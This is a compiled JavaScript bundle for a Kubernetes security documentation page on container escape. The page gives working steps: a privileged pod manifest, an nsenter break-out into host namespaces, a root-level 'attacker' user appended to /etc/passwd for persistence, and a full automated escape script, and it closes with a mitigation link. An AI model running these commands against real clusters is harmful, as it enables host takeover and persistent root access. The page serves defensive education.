"use strict";(self.webpackChunkk_8_s_security=self.webpackChunkk_8_s_security||[]).push([[222],{218:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>c,contentTitle:()=>o,default:()=>h,frontMatter:()=>i,metadata:()=>s,toc:()=>l});const s=JSON.parse('{"id":"attack_vectors/privileged_container_escape","title":"Container Escape","description":"How an attacker can break out of a container and gain control over the host system in Kubernetes.","source":"@site/docs/attack_vectors/privileged_container_escape.md","sourceDirName":"attack_vectors","slug":"/attack_vectors/privileged_container_escape","permalink":"/k8s_security/docs/attack_vectors/privileged_container_escape","draft":false,"unlisted":false,"editUrl":"https://github.com/geek-kb/k8s_security/edit/main/docs/attack_vectors/privileged_container_escape.md","tags":[],"version":"current","lastUpdatedBy":"Itai Ganot","lastUpdatedAt":1742801266000,"sidebarPosition":8,"frontMatter":{"sidebar_position":8,"title":"Container Escape","description":"How an attacker can break out of a container and gain control over the host system in Kubernetes."},"sidebar":"default","previous":{"title":"Misconfigured Admission Controllers","permalink":"/k8s_security/docs/attack_vectors/misconfigured_admission_controllers"},"next":{"title":"Denial of Service (DoS) Attacks","permalink":"/k8s_security/docs/attack_vectors/ddos_attacks"}}');var a=n(4848),r=n(8453);const i={sidebar_position:8,title:"Container Escape",description:"How an attacker can break out of a container and gain control over the host system in Kubernetes."},o="Container Escape",c={},l=[{value:"Exploitation Steps: Breaking Out of the Container Runtime",id:"exploitation-steps-breaking-out-of-the-container-runtime",level:2},{value:"1. Deploy a Privileged Pod",id:"1-deploy-a-privileged-pod",level:3},{value:"2. Check the Container Environment",id:"2-check-the-container-environment",level:3},{value:"3. Escape into Host Namespaces",id:"3-escape-into-host-namespaces",level:3},{value:"4. Add a Root User to the Host",id:"4-add-a-root-user-to-the-host",level:3},{value:"5. Execute an Automated Escape Script",id:"5-execute-an-automated-escape-script",level:3},{value:"Result",id:"result",level:3},{value:"Mitigation",id:"mitigation",level:2}];function d(e){const t={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,r.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(t.header,{children:(0,a.jsx)(t.h1,{id:"container-escape",children:"Container Escape"})}),"\n",(0,a.jsxs)(t.p,{children:["A ",(0,a.jsx)(t.strong,{children:"container escape"})," occurs when an attacker breaks out of the container isolation boundary and gains access to the underlying host system. This can lead to ",(0,a.jsx)(t.strong,{children:"root-level access"}),", data tampering, persistence, and lateral movement across the cluster."]}),"\n",(0,a.jsx)(t.hr,{}),"\n",(0,a.jsx)(t.h2,{id:"exploitation-steps-breaking-out-of-the-container-runtime",children:"Exploitation Steps: Breaking Out of the Container Runtime"}),"\n",(0,a.jsx)(t.p,{children:"An attacker targets a container with overly permissive configurations that allow host-level access."}),"\n",(0,a.jsx)(t.h3,{id:"1-deploy-a-privileged-pod",children:"1. Deploy a Privileged Pod"}),"\n",(0,a.jsx)(t.p,{children:"The attacker deploys a pod with elevated privileges, including:"}),"\n",(0,a.jsxs)(t.ul,{children:["\n",(0,a.jsx)(t.li,{children:(0,a.jsx)(t.code,{children:"privileged: true"})}),"\n",(0,a.jsx)(t.li,{children:(0,a.jsx)(t.code,{children:"hostPID: true"})}),"\n",(0,a.jsx)(t.li,{children:(0,a.jsx)(t.code,{children:"allowPrivilegeEscalation: true"})}),"\n",(0,a.jsx)(t.li,{children:(0,a.jsx)(t.code,{children:"runAsUser: 0"})}),"\n"]}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-yaml",children:'apiVersion: v1\nkind: Pod\nmetadata:\n  name: test\nspec:\n  hostPID: true\n  containers:\n    - image: busybox\n      name: test\n      command: ["sleep", "infinity"]\n      securityContext:\n        runAsUser: 0\n        allowPrivilegeEscalation: true\n        privileged: true\n  restartPolicy: Always\n'})}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:"kubectl apply -f test-pod.yaml\n"})}),"\n",(0,a.jsx)(t.hr,{}),"\n",(0,a.jsx)(t.h3,{id:"2-check-the-container-environment",children:"2. Check the Container Environment"}),"\n",(0,a.jsx)(t.p,{children:"The attacker verifies if the container shares namespaces with the host."}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:"ls -l /proc/1/ns/mnt\n"})}),"\n",(0,a.jsxs)(t.p,{children:["If the container can access ",(0,a.jsx)(t.code,{children:"/proc/1/root"}),", it indicates potential for escape."]}),"\n",(0,a.jsx)(t.hr,{}),"\n",(0,a.jsx)(t.h3,{id:"3-escape-into-host-namespaces",children:"3. Escape into Host Namespaces"}),"\n",(0,a.jsxs)(t.p,{children:["Using ",(0,a.jsx)(t.code,{children:"nsenter"}),", the attacker enters the host\u2019s namespace context:"]}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:"nsenter --target 1 --mount --uts --ipc --net --pid /bin/sh\n"})}),"\n",(0,a.jsx)(t.p,{children:"They verify the escape:"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:"hostname\nwhoami\n"})}),"\n",(0,a.jsxs)(t.p,{children:["If the commands return the ",(0,a.jsx)(t.strong,{children:"host\u2019s hostname"})," and ",(0,a.jsx)(t.strong,{children:"root user"}),", the escape is successful."]}),"\n",(0,a.jsx)(t.hr,{}),"\n",(0,a.jsx)(t.h3,{id:"4-add-a-root-user-to-the-host",children:"4. Add a Root User to the Host"}),"\n",(0,a.jsx)(t.p,{children:"For persistence, the attacker creates a root-level user:"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:"echo 'attacker:x:0:0::/root:/bin/bash' >> /etc/passwd\ngrep attacker /etc/passwd\n"})}),"\n",(0,a.jsx)(t.hr,{}),"\n",(0,a.jsx)(t.h3,{id:"5-execute-an-automated-escape-script",children:"5. Execute an Automated Escape Script"}),"\n",(0,a.jsx)(t.p,{children:"The attacker may use a script to automate the entire process:"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:'#!/bin/sh\n\necho "[*] Checking if the container has access to the host\'s root filesystem..."\nif [ ! -d "/proc/1/root" ]; then\n    echo "[-] Cannot access /proc/1/root. Escape is not possible."\n    exit 1\nfi\n\necho "[+] Host root filesystem detected at /proc/1/root."\necho "[*] Attempting to enter the host\'s namespaces..."\n\nexec nsenter --target 1 --mount --uts --ipc --net --pid --root=/proc/1/root /bin/sh -c \'\n    echo "[+] Successfully entered host namespaces."\n    echo "[*] Adding attacker user to /etc/passwd..."\n    echo "attacker:x:0:0::/root:/bin/bash" >> /etc/passwd\n    grep attacker /etc/passwd\n    echo "[*] Checking system state..."\n    echo "Hostname: $(hostname)"\n    echo "User: $(whoami)"\n    ps aux | grep kubelet\n    exec /bin/sh\n\'\n'})}),"\n",(0,a.jsx)(t.hr,{}),"\n",(0,a.jsx)(t.h3,{id:"result",children:"Result"}),"\n",(0,a.jsxs)(t.p,{children:["The attacker gains ",(0,a.jsx)(t.strong,{children:"interactive root access to the host"}),", bypassing container isolation. They can persist by creating a new host user, modify system files, or pivot to other nodes."]}),"\n",(0,a.jsx)(t.hr,{}),"\n",(0,a.jsx)(t.h2,{id:"mitigation",children:"Mitigation"}),"\n",(0,a.jsxs)(t.p,{children:["\u27a1 ",(0,a.jsx)(t.a,{href:"/docs/best_practices/cluster_setup_and_hardening/pod_security/container_escape_mitigation",children:"Preventing Container Escape"})]})]})}function h(e={}){const{wrapper:t}={...(0,r.R)(),...e.components};return t?(0,a.jsx)(t,{...e,children:(0,a.jsx)(d,{...e})}):d(e)}},8453:(e,t,n)=>{n.d(t,{R:()=>i,x:()=>o});var s=n(6540);const a={},r=s.createContext(a);function i(e){const t=s.useContext(r);return s.useMemo((function(){return"function"==typeof e?e(t):{...t,...e}}),[t,e])}function o(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:i(e.components),s.createElement(r.Provider,{value:t},e.children)}}}]);